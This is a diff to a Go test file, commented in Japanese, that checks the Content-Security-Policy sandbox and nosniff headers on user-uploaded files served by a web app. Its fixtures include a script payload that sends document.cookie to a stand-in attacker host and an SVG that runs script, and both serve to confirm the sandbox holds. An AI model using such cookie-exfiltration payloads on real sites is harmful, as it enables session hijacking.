@@ -70,7 +70,14 @@ func writeZipCacheFile(t *testing.T, userID string, repName string, hash string,
 
 func getZipCache(t *testing.T, ts *httptest.Server, path string, sessionID string) *http.Response {
 	t.Helper()
-	req, err := http.NewRequest(http.MethodGet, ts.URL+path, nil)
+	return getWithSessionCookie(t, ts.URL+path, sessionID)
+}
+
+// getWithSessionCookie は gkill_session_id クッキーを付けて GET する（空なら付けない）。
+// /files/ と /zip_cache/ はリクエストボディを読まないので、認証はクッキーだけで行う。
+func getWithSessionCookie(t *testing.T, url string, sessionID string) *http.Response {
+	t.Helper()
+	req, err := http.NewRequest(http.MethodGet, url, nil)
 	if err != nil {
 		t.Fatalf("NewRequest failed: %v", err)
 	}
@@ -79,7 +86,7 @@ func getZipCache(t *testing.T, ts *httptest.Server, path string, sessionID strin
 	}
 	resp, err := http.DefaultClient.Do(req)
 	if err != nil {
-		t.Fatalf("GET %s failed: %v", path, err)
+		t.Fatalf("GET %s failed: %v", url, err)
 	}
 	return resp
 }
@@ -184,6 +191,80 @@ func TestZipCacheFileServeIsolatesUsers(t *testing.T) {
 	})
 }
 
+// wantUserContentHTMLPolicy は利用者の HTML に付く CSP の期待値。
+// utils.go の定数を参照せずに文字列で書く —— 定数を書き換えるとテストの期待値も
+// 一緒に動いてしまい、緩めた（allow-same-origin を足した）ことに気付けなくなるため。
+const wantUserContentHTMLPolicy = "sandbox allow-scripts allow-downloads allow-modals"
+
+// userContentHeaderCase は利用者ファイル配信のセキュリティヘッダを1ファイルぶん検査する表の行。
+type userContentHeaderCase struct {
+	fileName    string // ディスクに置く名前
+	urlName     string // URL に書く名前（空なら fileName のまま）
+	content     string
+	wantCSP     string // "" は CSP を付けないこと
+	wantTypePfx string // Content-Type の前方一致。空なら見ない
+}
+
+// userContentHeaderCases は /files/ と /zip_cache/ の両方で使う表。
+//
+// Windows のファイルシステムは大小を区別しないので、大文字の拡張子は別の名前で置く。
+// index.html は http.FileServer がディレクトリへリダイレクトするので使わない。
+func userContentHeaderCases() []userContentHeaderCase {
+	// クッキーを読んで外へ送る、の形。sandbox の外で動くとそのまま漏れる
+	const html = "<script>fetch('//evil.invalid/'+document.cookie)</script>"
+	const pdf = "%PDF-1.4 dummy"
+	return []userContentHeaderCase{
+		{fileName: "page.html", content: html, wantCSP: wantUserContentHTMLPolicy},
+		{fileName: "page.htm", content: html, wantCSP: wantUserContentHTMLPolicy},
+		{fileName: "page.xhtml", content: html, wantCSP: wantUserContentHTMLPolicy},
+		{fileName: "upper.HTML", content: html, wantCSP: wantUserContentHTMLPolicy},
+		// r.URL.Path はデコード済みなので %2E の表記でも .html として判定されること
+		{fileName: "encoded.html", urlName: "encoded%2Ehtml", content: html, wantCSP: wantUserContentHTMLPolicy},
+		// SVG は <img> で表示する画像でもあり、文書として開いたときにスクリプトを動かす理由が無い
+		{fileName: "image.svg", content: `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`, wantCSP: "sandbox"},
+		{fileName: "note.txt", content: "plain text", wantCSP: "sandbox"},
+		{fileName: "doc.pdf", content: pdf, wantCSP: "", wantTypePfx: "application/pdf"},
+		{fileName: "upper.PDF", content: pdf, wantCSP: "", wantTypePfx: "application/pdf"},
+	}
+}
+
+func (c userContentHeaderCase) requestName() string {
+	if c.urlName != "" {
+		return c.urlName
+	}
+	return c.fileName
+}
+
+// assertUserContentSecurityHeaders は1件の応答のヘッダを表の行と突き合わせる。
+func assertUserContentSecurityHeaders(t *testing.T, resp *http.Response, c userContentHeaderCase) {
+	t.Helper()
+	if resp.StatusCode != http.StatusOK {
+		t.Fatalf("status = %d, want 200", resp.StatusCode)
+	}
+	if got := resp.Header.Get("X-Content-Type-Options"); got != "nosniff" {
+		t.Errorf("X-Content-Type-Options = %q, want %q", got, "nosniff")
+	}
+	gotCSP := resp.Header.Values("Content-Security-Policy")
+	switch {
+	case c.wantCSP == "" && len(gotCSP) != 0:
+		t.Errorf("Content-Security-Policy = %q, want none", gotCSP)
+	case c.wantCSP != "" && (len(gotCSP) != 1 || gotCSP[0] != c.wantCSP):
+		t.Errorf("Content-Security-Policy = %q, want exactly [%q]", gotCSP, c.wantCSP)
+	}
+	// allow-same-origin が付くと文書が gkill のオリジンに戻り、スクリプトが document.cookie で
+	// セッションIDを読める。ほかの許可が増えても、これだけは絶対に付かないこと
+	for _, value := range gotCSP {
+		if strings.Contains(value, "allow-same-origin") {
+			t.Errorf("Content-Security-Policy = %q, must not contain allow-same-origin", value)
+		}
+	}
+	if c.wantTypePfx != "" {
+		if got := resp.Header.Get("Content-Type"); !strings.HasPrefix(got, c.wantTypePfx) {
+			t.Errorf("Content-Type = %q, want prefix %q", got, c.wantTypePfx)
+		}
+	}
+}
+
 // TestZipCacheFileServeSetsSecurityHeaders は、利用者のファイルをそのまま返す経路に
 // セキュリティヘッダが付くことを確認する。
 //
@@ -192,7 +273,10 @@ func TestZipCacheFileServeIsolatesUsers(t *testing.T) {
 // 受け取った .cbz にHTMLが入っていればHTMLとして解釈される。
 // セッションクッキーはクライアント側のJSが document.cookie で書いており
 // HttpOnly を付けられないため、同一オリジンでスクリプトが動くと読み出せてしまう。
-// CSP sandbox は allow-scripts を付けていないので中のJSは実行されない。
+//
+// HTML（.html / .htm / .xhtml）は allow-scripts を付けた sandbox にする。allow-same-origin を
+// 付けないので文書は opaque origin になり、スクリプトは動くが gkill のクッキーにも
+// localStorage にも触れない（ADR-0711）。それ以外（SVG を含む）は allow-scripts の無い sandbox。
 //
 // 例外として .pdf は sandbox を付けない（付けると opaque origin になり
 // Chrome の内蔵PDFビューワが無効化されて表示できないため）。
@@ -200,6 +284,7 @@ func TestZipCacheFileServeIsolatesUsers(t *testing.T) {
 // HTMLを .pdf にリネームして持ち込んでもHTMLとしては解釈されない。
 //
 // ルート登録は serve.go と同じ形にしないとラッパーを通らないので注意。
+// /files/ 側の同じ検査は handle_file_serve_test.go の TestFileServeSetsSecurityHeaders。
 func TestZipCacheFileServeSetsSecurityHeaders(t *testing.T) {
 	gkillAPI, optCleanup := setupTestGkillServerAPI(t)
 	defer optCleanup()
@@ -211,59 +296,19 @@ func TestZipCacheFileServeSetsSecurityHeaders(t *testing.T) {
 	defer ts.Close()
 
 	sessionID := addZipCacheTestUser(t, gkillAPI, "carol")
-	// ZIPの中身としてHTMLやPDFが混じっている状況を作る
-	// index.html は http.FileServer がディレクトリへリダイレクトしてしまうので別名にする
-	htmlPath := writeZipCacheFile(t, "carol", "comics", "cccccccc", "page.html",
-		"<script>fetch('//evil/'+document.cookie)</script>")
-	pdfPath := writeZipCacheFile(t, "carol", "comics", "cccccccc", "doc.pdf",
-		"%PDF-1.4 dummy")
-	upperPdfPath := writeZipCacheFile(t, "carol", "comics", "cccccccc", "DOC.PDF",
-		"%PDF-1.4 dummy")
+	// ZIPの中身としてHTMLやSVGやPDFが混じっている状況を作る
+	cases := userContentHeaderCases()
+	for _, c := range cases {
+		writeZipCacheFile(t, "carol", "comics", "cccccccc", c.fileName, c.content)
+	}
 
-	t.Run("HTMLにはsandboxとnosniffが付く", func(t *testing.T) {
-		resp := getZipCache(t, ts, htmlPath, sessionID)
-		defer resp.Body.Close()
-
-		if resp.StatusCode != http.StatusOK {
-			t.Fatalf("status = %d, want 200", resp.StatusCode)
-		}
-		if got := resp.Header.Get("X-Content-Type-Options"); got != "nosniff" {
-			t.Errorf("X-Content-Type-Options = %q, want %q", got, "nosniff")
-		}
-		if got := resp.Header.Get("Content-Security-Policy"); got != "sandbox" {
-			t.Errorf("Content-Security-Policy = %q, want %q", got, "sandbox")
-		}
-	})
-
-	t.Run("PDFにはsandboxが付かずnosniffは付く", func(t *testing.T) {
-		resp := getZipCache(t, ts, pdfPath, sessionID)
-		defer resp.Body.Close()
-
-		if resp.StatusCode != http.StatusOK {
-			t.Fatalf("status = %d, want 200", resp.StatusCode)
-		}
-		if got := resp.Header.Get("Content-Security-Policy"); got != "" {
-			t.Errorf("Content-Security-Policy = %q, want empty", got)
-		}
-		if got := resp.Header.Get("X-Content-Type-Options"); got != "nosniff" {
-			t.Errorf("X-Content-Type-Options = %q, want %q", got, "nosniff")
-		}
-		if got := resp.Header.Get("Content-Type"); !strings.HasPrefix(got, "application/pdf") {
-			t.Errorf("Content-Type = %q, want application/pdf", got)
-		}
-	})
-
-	t.Run("拡張子の大小は無視してPDF扱いする", func(t *testing.T) {
-		resp := getZipCache(t, ts, upperPdfPath, sessionID)
-		defer resp.Body.Close()
-
-		if resp.StatusCode != http.StatusOK {
-			t.Fatalf("status = %d, want 200", resp.StatusCode)
-		}
-		if got := resp.Header.Get("Content-Security-Policy"); got != "" {
-			t.Errorf("Content-Security-Policy = %q, want empty", got)
-		}
-	})
+	for _, c := range cases {
+		t.Run(c.requestName(), func(t *testing.T) {
+			resp := getZipCache(t, ts, "/zip_cache/comics/cccccccc/"+c.requestName(), sessionID)
+			defer resp.Body.Close()
+			assertUserContentSecurityHeaders(t, resp, c)
+		})
+	}
 }
 
 // TestBuildZipEntriesMediaFlags は、ZIP展開物の一覧に付く種別フラグが
